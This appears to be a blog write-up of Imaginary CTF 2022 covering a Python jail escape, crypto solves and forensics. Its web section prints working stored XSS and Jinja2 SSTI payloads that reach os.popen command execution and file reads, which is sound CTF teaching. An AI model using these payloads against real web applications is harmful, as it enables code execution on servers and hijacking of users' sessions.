@@ -1,0 +1,852 @@
+---
+layout: post
+title:  "Imaginary CTF 2022 Writeup"
+tags: CTF
+---
+
+- Introduction
+- Misc
+  - pyprison
+  - neoannophobia
+- Crypto
+  - Secure Encoding: Hex
+  - huge
+  - cbc
+- Web
+  - Democracy
+  - SSTI Golf
+  - minigolf
+- Forensics
+  - journey
+  - Ogre
+  - improbus
+- Conclusion
+- Lessons Learned
+{:toc}
+
+&nbsp;
+
+
+## **Introduction**
+
+Imaginary CTF is back, need I say more?
+
+&nbsp;
+
+## **Misc**
+
+### **pyprison**
+
+>What's a CTF without a good, old-fashioned pyjail?
+>
+>Created By: Eth007
+
+To start off, we're breaking out of here. For this challenge, we have to read a
+file on a remote system. The trick of it is that we are restricted to using only
+a small subset of characters to create python statements. Luckily, we are given
+the code for the inner-workings of this prison.
+
+```python
+#!/usr/bin/env python3
+
+while True:
+  a = input(">>> ")
+  assert all(n in "()abcdefghijklmnopqrstuvwxyz" for n in a)
+  exec(a)
+```
+
+So, we are restricted to sending commands that use only lowercase letters a through
+z and some regular parenthesis. At first, this seemed pretty tricky. What sort of
+Python can you make with only lowercase letters? But after messing around a bit,
+I got a little trick going to use more than just some letters and brackets. We can
+use `exec(input())` as our initial command to essentially escape the restrictions.
+This statement fits the restrictions easily. Plus, using `input()` lets us
+supply any code we want to `exec()`.
+
+[![Using exec input](/assets/ICTF-2022/prisonsss.png)](/assets/ICTF-2022/prisonsss.png)
+<figcaption align=center><b>Figure 1.1: Using exec(input()) to Print a Message in pyprsion</b></figcaption>
+&nbsp;
+
+So, I could basically jump right ahead to listing directory contents and
+print out any flags I found. And just like that, the flag is ours.
+
+[![pyprison flag](/assets/ICTF-2022/prison1.png)](/assets/ICTF-2022/prison1.png)
+<figcaption align=center><b>Figure 1.2: Printing Out the Flag in pyprison</b></figcaption>
+&nbsp;
+
+>
+
+&nbsp;
+
+### **neoannophobia**
+
+>Can you beat my game?
+>
+>Created By: Eth007
+
+This challenge was an interesting one. The idea behind this challenge was we have
+to beat the "AI" at a sort of calendar game. Sounds easy enough. But, we have to
+win 100 times to get the flag.
+
+[![How to Play the Calendar Game](/assets/ICTF-2022/neo1.png)](/assets/ICTF-2022/neo1.png)
+<figcaption align=center><b>Figure 2.1: The Introduction and Rules of the Calendar Game</b></figcaption>
+&nbsp;
+
+Figure 2.1 shows the full rules and how to play the game. If you're *really*
+patient and careful, you can probably just win 100 times manually. But, I'm neither
+patient nor careful. So, automating is the only way I had a chance at solving this.
+
+Before I get started explaining a solution, there are a few quirks to think about.
+First, the "AI" doesn't always make a good move. In fact, often it will just let
+you win on the first move. Another unique feature is November 31st exists in this
+game. It doesn't change much but it is funny to see the AI flip the table as it's
+about to lose. Anyway, here's my solution:
+
+[![Calendar Game Winning Days](/assets/ICTF-2022/calendar.png)](/assets/ICTF-2022/calendar.png)
+<figcaption align=center><b>Figure 2.2: All Important Dates in the Calendar Game</b></figcaption>
+&nbsp;
+
+First, how do we win the game every time? Figure 2.2 is a little flow chart of the
+basic logic my solution script follows. The idea behind it is that every month has
+a specific day that leads to a win. If we can use any of these days for our turn,
+we can weasel our way to a guaranteed win.
+
+Forcing our opponent to pick any day in December or the 31st of any month is a win.
+So, naturally, November 30th is a key day that forces our opponent into picking one
+of those options. The same goes for October 29th; it forces the opponent to gives us
+a chance to pick November 30th. This chain continues until the first key day:
+January 20th.
+
+The only problem point is the starting move. If our opponent plays January 20th to
+start the game, we *should* lose. Luckily, our opponent isn't perfect and unless
+we are really unlucky, it will eventually make a mistake.
+
+```python
+from pwn import *
+
+month_index = {b'February': b'21', b'March': b'22', b'April': b'23', b'May': b'24', b'June': b'25', b'July': b'26',
+               b'August': b'27', b'September': b'28', b'October': b'29', b'November': b'30', b'December': b'31'}
+
+date_index = {b'21': b'February', b'22': b'March', b'23': b'April', b'24': b'May', b'25': b'June', b'26': b'July',
+              b'27': b'August', b'28': b'September', b'29': b'October', b'30': b'November', b'31': b'December'}
+
+io = remote('neoannophobia.chal.imaginaryctf.org', 1337)
+
+io.recvuntil(b'----------')
+io.recvuntil(b'----------\n')
+
+win = False
+
+
+def get_next_date():
+    date = io.recvuntil(b'> ')[:-3]
+    return date
+
+
+def win_logic(date):
+    month = date[:-3]
+    d_num = date[-2:]
+
+    if month == b'January' and d_num == b'20':
+        io.sendline(b'January 21')
+        return False
+
+    if d_num == b'31':
+        io.sendline(b'December 31')
+        return True
+    if month in month_index.keys():
+        if d_num < month_index[month]:
+            io.sendline(month + b' ' + month_index[month])
+            if month == b'December':
+                return True
+            return False
+    if d_num in date_index.keys():
+        io.sendline(date_index[d_num] + b' ' + d_num)
+        if d_num == b'31':
+            return True
+        return False
+    else:
+        io.sendline(b'January 20')
+    return False
+
+
+for i in range(100):
+    print("Round: " + i)
+    while not win:
+        next_date = get_next_date()
+        win = win_logic(next_date)
+    if i == 99:
+        data = io.recvall()
+        io.interactive()
+    io.recvuntil(b'----------')
+    data = io.recvuntil(b'----------\n')
+    win = False
+
+
+data = io.recvall()
+print(data)
+```
+
+Here is my solution script. It performs the necessary communication with the game
+server and utilizes the key days to win most games. After a quick run (with
+hopefully not bad luck) the server spits out the flag and the challenge is
+complete.
+
+[![Calendar Game Flag](/assets/ICTF-2022/neo2.png)](/assets/ICTF-2022/neo2.png)
+<figcaption align=center><b>Figure 2.3: Neoannophobia's Flag</b></figcaption>
+&nbsp;
+
+>ictf{br0ken_game_smh_8b1f014a}
+
+&nbsp;
+
+## **Crypto**
+
+### **Secure Encoding: Hex**
+
+>Cryptograms == encryption, right? Flag is readable English.
+>
+>Created By: puzzler7
+
+For the first crypto challenge, we have an interesting encoding challenge.
+Well, it's not exactly a usual encoding but we'll get to that in a bit.
+First, we are given a script and some output for it.
+
+```python
+#!/usr/bin/env python3
+
+from random import shuffle
+
+charset = '0123456789abcdef'
+shuffled = [i for i in charset]
+shuffle(shuffled)
+
+d = {charset[i]:v for(i,v)in enumerate(shuffled)}
+
+pt = open("flag.txt").read()
+assert all(ord(i)<128 for i in pt)
+
+ct = ''.join(d[i] for i in pt.encode().hex())
+f = open('out.txt', 'w')
+f.write(ct)
+```
+
+>0d0b18001e060d090d1802131dcf011302080ccf0c070b0f080d0701cf00181116
+
+So, from the looks of things, this script works to convert the flag into a weird
+scrambled version itself in hex.
+
+```python
+charset = '0123456789abcdef'
+shuffled = [i for i in charset]
+shuffle(shuffled)
+
+d = {charset[i]:v for(i,v)in enumerate(shuffled)}
+
+...
+
+ct = ''.join(d[i] for i in pt.encode().hex())
+```
+
+The script scrambles the list of hex characters and the scrambled list as a sort of
+substitution alphabet. Each hex digit is substituted with a different hex digit.
+So, it turns out it's more of a substitution cipher than a straight-up encoding.
+Now the question becomes how to decrypt a substitution cipher.
+
+Normally, using a combination of letter frequencies, bigram frequencies, word
+frequencies, etc. would all play a part in figuring out the substitution alphabet.
+Since we are using hex, it makes it a bit more wacky. I decided on using bigrams
+would help figure out what exactly I'm looking at.
+
+[![Ascii Table](/assets/ICTF-2022/ascii.png)](/assets/ICTF-2022/ascii.png)
+<figcaption align=center><b>Figure 3.1: An Ascii Table</b></figcaption>
+&nbsp;
+
+I narrowed down the range of acceptable bigrams by looking at which values
+could create a reasonable flag. The range was from hex 0x20 to hex 0x7e. Speaking
+of reasonable values, another lead I followed was a known crib for the flag.
+The flag format had to follow `ictf{...}`. So, this means we know the first 5 hex
+values and the last one as well as what they turned into. I could finally start
+building a translation.
+
+>0 1 2 3 4 5 6 7 8 9 A B C D E F - Original Hex Alphabet
+>? ? ? B 8 ? 0 1 ? D ? E ? 6 ? ? - New Scrambled Hex Alphabet
+
+Just from those few characters we already have half an alphabet. The next step
+was to put it all together and make a script to do some work for me.
+
+```python
+ct = '0d0b18001e060d090d1802131dcf011302080ccf0c070b0f080d0701cf00181116'
+
+ct_singlets = [ct[i:i+1] for i in range(0, len(ct), 1)]
+ct_blocks = [ct[i:i+2] for i in range(0, len(ct), 2)]
+
+known_values = {'0': 'a', '1': '2', '2': '3', '3': ct_singlets[3], '4': ct_singlets[5],
+                '5': 'c', '6': ct_singlets[0], '7': ct_singlets[4], '8': '5', '9': ct_singlets[1], 'a': '4',
+                'b': ct_singlets[9], 'c': '9', 'd': '6', 'e': '7', 'f': 'f'}
+
+result = ''
+for block in ct_blocks:
+    new_block = ''
+    for character in block:
+        if character in known_values.values():
+            new_block += list(known_values.keys())[list(known_values.values()).index(character)]
+        else:
+            new_block += character
+    if int(new_block, 16) > 128:
+        print('Translation Failed: Input Value for ' + block + ' is too large')
+        exit()
+    if int(new_block, 16) < 33:
+        print('Translation Failed: Input Value for ' + block + ' is too small')
+        exit()
+    result += new_block
+
+print(result)
+byte_str = bytes.fromhex(result)
+print(byte_str)
+```
+
+Unfortunately, I'm not nearly good enough of a programmer to make this interactive
+so I had to sub in values manually. In the script you can see some of the values
+I sniffed out through trial and error. At the end of the day, that's what solving
+the rest of this problem comes down to (at least with a simple approach). Anyway,
+after a lot of trial and error I had found the right combinations to decrypt the
+flag.
+
+>
+
+
+&nbsp;
+
+### **huge**
+
+>Huge primes = huge security
+>
+>Created By: Eth007
+
+Time for a good 'ole RSA challenge. For this one, we are given a script and some
+output with the public parameters and ciphertext.
+
+```python
+from Crypto.Util.number import bytes_to_long, getPrime
+from random import randint
+
+flag = open("flag.txt", "rb").read()
+
+def get_megaprime():
+  primes = [getPrime(10) for _ in range(200)]
+  out = 1
+  for n in range(100):
+    if randint(0,1) == 0:
+      out *= primes[n]
+  return out
+
+p = get_megaprime()
+q = get_megaprime()
+n = p*q
+e = 65537
+m = bytes_to_long(flag)
+
+c = pow(m, e, n)
+
+print(f"{n = }")
+print(f"{e = }")
+print(f"{c = }")
+```
+
+The script itself is a bit funky. It has this function to create **megaprimes**.
+However, these **megaprimes** are just a product of a bunch of smaller primes.
+With that in mind, I thought I would give factoring n a shot.
+
+[![Aperton](/assets/ICTF-2022/factor.png)](/assets/ICTF-2022/factor.png)
+<figcaption align=center><b>Figure 4.1: Alpertron's Factor Calculator Facotring N</b></figcaption>
+&nbsp;
+
+Using a program like the one [here](https://www.alpertron.com.ar/ECM.HTM) results in a list of factors popping
+out really quick. This specific site is really nice because it also calculates
+Euler's totient using the factors, saving me time when I create the decryption
+exponent.
+
+From here, it's as simple as calculating the decryption exponent and retrieving
+the plaintext flag. To do these we just use the decryption equations and we get
+the following flag:
+
+[![Math](/assets/ICTF-2022/math.png)](/assets/ICTF-2022/math.png)
+
+>
+
+&nbsp;
+
+### **cbc**
+
+>I don't trust everyone's CBC implementations. So I rolled my own, with A HUNDRED
+>PERCENT GUARANTEE OF DATA INTEGRITY!
+>
+>Created By: Eth007
+
+The final Crypto challenge I went through was cbc. In cbc we are tasked with
+decrypting a custom AES CBC implementation. We are given a script for the
+implementation so, let's have a look:
+
+```python
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from os import urandom
+
+def cbc_encrypt(msg: bytes):
+  msg = pad(msg, 16)
+  msg = [msg[i:i+16] for i in range(0, len(msg), 16)]
+  key = urandom(16)
+  out = []
+  for block in msg:
+    cipher = AES.new(key, AES.MODE_ECB)
+    next = cipher.encrypt(block)
+    out.append(next)
+    key = next
+  out = b"".join(out)
+  return key, out
+
+def main():
+  key, ct = cbc_encrypt(open("flag.txt", "rb").read()*3)
+  print(f"{ct = }")
+
+if __name__ == "__main__":
+  main()
+
+# ct = b"\xa2\xb8 <\xf2\x85\xa3-\xd1\x1aM}\xa9\xfd4\xfag<p\x0e\xb7|\xeb\x05\xcbc\xc3\x1e\xc3\xefT\x80\xd3\xa4 ~$\xceXb\x9a\x04\xf0\xc6\xb6\xd6\x1c\x95\xd1(O\xcfx\xf2z_\xc3\x87\xa6\xe9\x00\x1d\x9f\xa7\x0bm\xca\xea\x1e\x95T[Q\x80\x07we\x96)t\xdd\xa9A 7dZ\x9d\xfc\xdbA\x14\xda9\xf3\xeag\xe3\x1a\xc8\xad\x1cnL\x91\xf6\x83'\xaa\xaf\xf3i\xc0t=\xcd\x02K\x81\xb6\xfa.@\xde\xf5\xaf\xa3\xf1\xe3\xb4?\xf9,\xb2:i\x13x\xea1\xa0\xc1\xb9\x84"
+```
+
+The script seems to read the flag 3 times, pad it, make a random key, and encrypt
+the flag. But, focusing in on the cbc_encrypt function, this script doesn't exactly
+look like CBC mode.
+
+[![CBC Diagram](/assets/ICTF-2022/cbc.png)](/assets/ICTF-2022/cbc.png)
+<figcaption align=center><b>Figure 5.1: AES CBC Mode Diagram</b></figcaption>
+&nbsp;
+
+Just looking at the CBC mode overview diagram, like the one in Figure 5.1, we are
+missing the IV. But also, it seems like this implementation of CBC doesn't match
+the diagram at all.
+
+``` python
+for block in msg:
+  cipher = AES.new(key, AES.MODE_ECB)
+  next = cipher.encrypt(block)
+  out.append(next)
+  key = next
+```
+
+In the code block above, we can see the glaring flaw. To encrypt each block of
+plaintext, the script uses the previous block of ciphertext as the key. This means
+we have a bunch of the keys used to create the ciphertext. So, we should be able
+to reverse the process and recover some plaintext.
+
+```python
+from Crypto.Util.number import long_to_bytes
+from Crypto.Cipher import AES
+
+ct = b"\xa2\xb8 <\xf2\x85\xa3-\xd1\x1aM}\xa9\xfd4\xfag<p\x0e\xb7|\xeb\x05\xcbc\xc3\x1e\xc3\xefT\x80\xd3\xa4 ~$\xceXb\x9a\x04\xf0\xc6\xb6\xd6\x1c\x95\xd1(O\xcfx\xf2z_\xc3\x87\xa6\xe9\x00\x1d\x9f\xa7\x0bm\xca\xea\x1e\x95T[Q\x80\x07we\x96)t\xdd\xa9A 7dZ\x9d\xfc\xdbA\x14\xda9\xf3\xeag\xe3\x1a\xc8\xad\x1cnL\x91\xf6\x83'\xaa\xaf\xf3i\xc0t=\xcd\x02K\x81\xb6\xfa.@\xde\xf5\xaf\xa3\xf1\xe3\xb4?\xf9,\xb2:i\x13x\xea1\xa0\xc1\xb9\x84"
+
+ct_blocks = [ct[i*16:(i+1)*16] for i in range(0, 9)]
+
+result = b''
+for i in range(len(ct_blocks)-1):
+    cipher = AES.new(ct_blocks[i], AES.MODE_ECB)
+    result += cipher.decrypt(ct_blocks[i+1])
+
+print(result)
+```
+
+Here is the quick solver script I made. It basically uses the previous block of
+ciphertext as the key to decrypt the next block. Luckily, the flag is also repeated
+in the ciphertext so we don't miss out on a portion of it. After a running the
+solver, we get the following output.
+
+>b'mplemented_cbc_wrong_02b413a9}\nictf{i_guess_i_implemented_cbc_wrong_02b413a9}\nictf{i_guess_i_implemented_cbc_wrong_02b413a9}\n\x03\x03\x03'
+
+>ictf{i_guess_i_implemented_cbc_wrong_02b413a9}
+
+&nbsp;
+
+## **Web**
+
+### **Democracy**
+
+>I'm tired of all these skill-based CTF challenges. Y'know what we need more of
+>here? Politics! Simply convince (or strongarm) your fellow competitors to vote for
+>you
+>
+>Created By: puzzler7
+
+The first Web challenge I want to look at is an interesting one. The basic idea of
+this challenge is to somehow trick other CTF players into voting for you. There
+were a handful of ways to solve this, the main vulnerability however, is XSS within
+usernames. But first I thought I'd try just asking nicely for votes.
+
+[![Asking nicely for votes](/assets/ICTF-2022/demo1.png)](/assets/ICTF-2022/demo1.png)
+<figcaption align=center><b>Figure 6.1: Using XSS to Ask Nicely for Votes</b></figcaption>
+&nbsp;
+
+First I registered 2 accounts, one named Greg and another named
+`<script>alert('Vote for Greg! :)')`. After voting for the second, other users
+should receive the alert in Figure 6.1. Hopefully, that gets people to vote for
+me!
+
+Okay, as you can probably guess, that didn't work. I guess there really is no
+compassion left in this world. After a quick crying session, I went back to the
+drawing board and decided to get my elbows out this time.
+
+```html
+<script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function pls(){
+  await sleep(20);
+  if (document.cookie.indexOf('user') > -1 ) {
+    window.location.replace('http://chal.imaginaryctf.org:1339/vote/9ddf37f5ca554f09aeb8b68c03edcb26');
+  }
+}
+
+pls();
+</script>
+```
+
+Okay, this time I tried to be a bit more aggressive. I set up an account with
+the XSS payload above as its name. This payload should target logged in users
+and redirect them to the page to vote for my other account. Once all the accounts
+are registered and the XSS payload is on the voting page, it's just a matter of
+waiting for the votes to come rolling in.
+
+[![Greg won!](/assets/ICTF-2022/demo2.png)](/assets/ICTF-2022/demo2.png)
+<figcaption align=center><b>Figure 6.2: Greg Winning the Vote</b></figcaption>
+&nbsp;
+
+Eventually, Greg won the vote and the flag was revealed.
+
+>
+
+Here is a quick aside just to take a moment to list the other solutions. It turns
+out you could just make a ton of accounts and vote since IP validation did not work.
+Also, after a while the challenge was shut down due to player-player attacks. So if
+you waited long enough, you could get the flag that way.
+
+&nbsp;
+
+### **SSTI Golf**
+
+>Just in case you didn't get enough golf with the other challenge. Flag is in an
+>arbitrarily named file, but in the same directory.
+>
+>Created By: puzzler7
+
+It's always good to go back to a classic SSTI challenge. For this challenge, we do
+have some code given to us. Let's take a look at it.
+
+```python
+#!/usr/bin/env python3
+
+from flask import Flask, render_template_string, request, Response
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return Response(open(__file__).read(), mimetype='text/plain')
+
+@app.route('/ssti')
+def ssti():
+    query = request.args['query'] if 'query' in request.args else '...'
+    if len(query) > 48:
+        return "Too long!"
+    return render_template_string(query)
+
+app.run('0.0.0.0', 1337)
+```
+
+So, unlike a lot of SSTI challenges, we have a very strict length requirement for
+our input and therefore, our payload. Using less than 48 characters is definitely
+very tricky. It stops me from using typical payloads since they are usually
+*really* long. I definitely needed to do some quick searches to figure out how to
+shorten the payload.
+
+I quickly found a [link to a great resource for short SSTI payloads](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/).
+First, I learned about a small way to get access to the os.popen function.
+
+```
+\{\{lipsum.__globals__.os.popen('ls').read()\}\}
+```
+
+This is the shortest payload I had seen at that moment. It is just short enough to
+avoid the filter.
+
+[![Listing Files](/assets/ICTF-2022/sstig1.png)](/assets/ICTF-2022/sstig1.png)
+<figcaption align=center><b>Figure 7.1: Using SSTI to Print the File Names</b></figcaption>
+&nbsp;
+
+Well, turns out the file really was arbitrarily named. But that file name is really
+long. Luckily, I learned another thing from the blog about short payloads. Turns out
+we can use request arguments or set custom application configuration items to
+substitute in long strings.
+
+```
+\{\{config.update(y=request.args.a)\}\}&y=cat%20truly_an_arbitrarily_named_file
+```
+
+Now, I just needed to substitute this into the old payload and see the result.
+
+```
+\{\{lipsum.__globals__.os.popen(config.y).read()\}\}
+```
+
+[![Flag get!](/assets/ICTF-2022/sstig2.png)](/assets/ICTF-2022/sstig2.png)
+<figcaption align=center><b>Figure 7.2: Using SSTI to Print Out the Flag</b></figcaption>
+&nbsp;
+
+And just like that, the flag is printed out and the challenge is complete.
+
+>ictf{F!1+3r5s!?}
+
+&nbsp;
+
+### **minigolf**
+
+>Too much Flask last year... let's bring it back again.
+>
+>Created By: Eth007
+
+This challenge feels like a follow-up to SSTI Golf. We are given another scenario
+where we have to have to read a flag using SSTI with a really small payload.
+However, this time we also have a blacklist to worry about.
+
+```python
+from flask import Flask, render_template_string, request, Response
+import html
+
+app = Flask(__name__)
+
+blacklist = ["{{", "}}", "[", "]", "_"]
+
+@app.route('/', methods=['GET'])
+def home():
+  print(request.args)
+  if "txt" in request.args.keys():
+    txt = html.escape(request.args["txt"])
+    if any([n in txt for n in blacklist]):
+      return "Not allowed."
+    if len(txt) <= 69:
+      return render_template_string(txt)
+    else:
+      return "Too long."
+  return Response(open(__file__).read(), mimetype='text/plain')
+
+app.run('0.0.0.0', 1337)
+```
+
+The blacklist is pretty strict given what payloads I have done in the past.
+The biggest new restriction for me was no double curly braces allowed. Luckily,
+it's a quick solve. In flask templates curly braces are just an alias for `\{% print() %\}`.
+So, we can do everything we normally do, only, it costs us a few extra characters.
+For example,
+
+```
+\{%print(config.items())%}
+```
+
+Now, we just need to somehow make a payload to read the flag with less than 69
+characters. I did a lot of thinking for this part, but eventually, learned a fun
+trick. Back in SSTI Golf, we made a custom entry in the app configuration. We set
+a key y to have a value of `cat%20truly_an_arbitrarily_named_file`. The trick comes
+in when we supply an object instead of just a string.
+
+```
+{%print(config.update(y=SOME_OBJECT))%
+```
+
+Using this idea we can put any object we want into the config and refer to its
+children or attributes pretty easily. So, I went forward with trying to get the
+payload from SSTI Golf injected into this challenge.
+
+```
+{%print(config.update(a=request.args.a))}&a=__globals__
+```
+
+First, I needed to get access to globals. However, with the blacklist restrictions
+underscores are blocked. So, to get access to it I added the string to the config.
+
+```
+{%print(config.update(b=lipsum|attr(config.a)))}
+```
+
+Next, I added the `lipsum.__globals__` object to the config so I could easily
+access the os module. So, at this point we can access popen with a payload
+containing `config.b.os.popen()`.
+
+```python
+txt = html.escape(request.args["txt"])
+```
+
+Before we get to the next step, I wanted to point out this line of code.
+The script esacpes our input making it a tiny bit more difficult to add commands to
+popen. It essentially means we cannot use single quotes or double quotes in
+commands without causing an error. So, we also have to add our commands to the
+config to avoid this.
+
+```
+{%print(config.update(c=request.args.c))%}&c=ls
+{%print(config.b.os.popen(config.c).read())%}
+```
+
+[![Directory listing](/assets/ICTF-2022/mini1.png)](/assets/ICTF-2022/mini1.png)
+<figcaption align=center><b>Figure 8.1: Using Our Small Payload to Print File Listings</b></figcaption>
+&nbsp;
+
+The output of our new Frankenstein command gives us the directory file list.
+This time the flag has a very simple name. The final step is to add a cat command
+to the config and send our final payload.
+
+```
+{%print(config.update(d=request.args.d))%}&d=cat%20flag.txt
+{%print(config.b.os.popen(config.d).read())%}
+```
+
+[![The minigolf flag printed](/assets/ICTF-2022/mini2.png)](/assets/ICTF-2022/mini2.png)
+<figcaption align=center><b>Figure 8.2: Printing Out the Flag for Minigolf</b></figcaption>
+&nbsp;
+
+Finally, we have our flag and the challenge is complete!
+
+>ictf{whats_in_the_flask_tho}
+
+&nbsp;
+
+## **Forensics**
+
+### **journey**
+
+>Max49 went on a trip... can you figure out where? The flag is >ictf{latitude_longitude}
+>
+>Created By: Max49
+
+Ah, a classic location finding challenge, one of my favorites. For this challenge
+we have a picture of some alley and we need to find the latitude and longitude of
+the location.
+
+[![The Alley]()]()
+<figcaption align=center><b>Figure 9.1: The Original Challenge Image</b></figcaption>
+&nbsp;
+
+Luckily, there are lots of details in this picture. If we zoom in on some parts we
+can find some identifying details.
+
+[![Directions Sign]()]()
+<figcaption align=center><b>Figure 9.2: A Zoomed-in View of a Sign in the Photo</b></figcaption>
+&nbsp;
+
+The most identifying piece was this sign mentioning Via Pedota 9. A quick google
+search reveals it is a street in the Italian city of Orvieto.
+
+[![Via Pedota 9]()]()
+<figcaption align=center><b>Figure 9.3: A Google Maps View of Via Pedota 9</b></figcaption>
+&nbsp;
+
+The accuracy of our guess can be a bit off because we are instructed to round up to
+3 decimal places for our longitude and latitude. So, I tried just putting the immediate
+coordinates rounded up as the flag.
+
+>
+
+And with that, the challenge was solved.
+
+&nbsp;
+
+### **Ogre**
+
+>What are you doing in my swamp?!
+>
+>Created By: iCiaran
+
+For the next forensics challenge, we are command to pull a docker image from a repository.
+So to being, let's run the command.
+
+[![Docker command](/assets/ICTF-2022/ogresss.png)](/assets/ICTF-2022/ogresss.png)
+<figcaption align=center><b>Figure 10.1: Using Docker to Pull the Challenge Image</b></figcaption>
+&nbsp;
+
+Now that we have the image on our machine, it's time to begin investigating. I'm no expert
+on docker so I decided to look to see if there is any way I can extract files or building
+instructions from an image. I quickly found that I could look at the ["history"](https://docs.docker.com/engine/reference/commandline/history/) of an image.
+
+[![Docker History](/assets/ICTF-2022/ogre2.png)](/assets/ICTF-2022/ogre2.png)
+<figcaption align=center><b>Figure 10.2: Examining the History of the Challenge Image</b></figcaption>
+&nbsp;
+
+Executing the history command on the image reveals the various changes to it over time.
+One specific instruction from the list was particularly interesting, it seemed to have
+some Base64 text in it. So naturally, I tried a quick decode.
+
+>
+
+The Base64 text was indeed important, in fact, it was the flag!
+
+&nbsp;
+
+### **improbus**
+
+>Did Caesar like PNG files?
+>
+>Created By: Eth007
+
+Before I begin with this one, I have to say that my solution was nowhere near
+intended. But, I will include some details on the intentional one that was mentioned
+after the competition was over.
+
+#### Unintended Solution
+
+So, for this challenge we are given a png file that seems to be corrupt. It doesn't
+load by normal software and pngcheck has no idea what it even is.
+
+[![Hex File](/assets/ICTF-2022/imp.png)](/assets/ICTF-2022/imp.png)
+<figcaption align=center><b>Figure 11.1: A Hex Dump of the Challenge PNG</b></figcaption>
+&nbsp;
+
+The hex of the png looks a little bit odd... Most notably, the header is definitely
+wrong. However, when I changed that first byte it did not solve the issue. While
+trying some weird tests, I thought maybe there was some sort of Caesar shift going
+on for some of the bytes (because of the description). So I popped the file into
+Cyberchef
+
+[![Flag?](/assets/ICTF-2022/chef.png)](/assets/ICTF-2022/chef.png)
+<figcaption align=center><b>Figure 11.2: Cyberchef Solving the Challenge for Us</b></figcaption>
+&nbsp;
+
+And Cyberchef just straight-up printed the flag for me. I guess Cyberchef is just
+too powerful.
+
+>
+
+#### Intended Solution
+
+&nbsp;
+
+## **Conclusion**
+
+This years ImaginaryCTF was another hit for me. There were so many unique challenges
+from the ones I tried. There was even one on System Hardening that was particularly
+interesting to me (I just wish I had solved it). Overall, the event had a great range
+of difficulty and consistent infrastructure that made the event very smooth to play.
+Definitely lived up to the hype I had for it since last year.
+
+Thank you to all the challenge creators and the ImaginaryCTF staff for creating another
+of my personal favorite events!
+
+&nbsp;
+
+## **Lessons Learned**
+
+1. Decrypting Substitution Ciphers: Guess and Check Methods
+2. RSA: Problems with Bad P and Q
+3. SSTI with Small Payloads
+4. Basic Docker Commands
+5. Latin Encodings
